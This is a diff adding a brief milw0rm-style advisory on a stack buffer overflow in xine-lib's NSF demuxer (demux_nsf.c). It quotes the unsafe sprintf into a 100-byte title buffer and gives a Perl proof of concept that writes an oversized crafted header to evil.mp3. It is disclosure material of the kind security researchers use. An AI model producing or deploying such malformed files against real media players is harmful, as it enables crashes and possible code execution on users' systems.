@@ -1,0 +1,29 @@
+xine-lib <= 1.1.12 is prone to a stack-based buffer overflow in the NES 
+Sound Format demuxer(demux_nsf.c).
+
+
+- Code
+
+open_nsf_file():
+
+109: this->title = strdup(&header[0x0E]);
+
+demux_nsf_send_chunk():
+
+122: char title[100];
+162: sprintf(title, "%s, song %d/%d",
+            this->title, this->current_song, this->total_songs);
+
+
+- Affected applications
+
+http://xinehq.de/index.php/releases
+
+
+- PoC
+
+perl -e 'print 
+"\x4E\x45\x53\x4D\x1A\x01\x01\x01\x80\x80\x18\x8A\x03\x8A" . "\x41" x 
+114' > evil.mp3
+
+# milw0rm.com [2008-04-16]
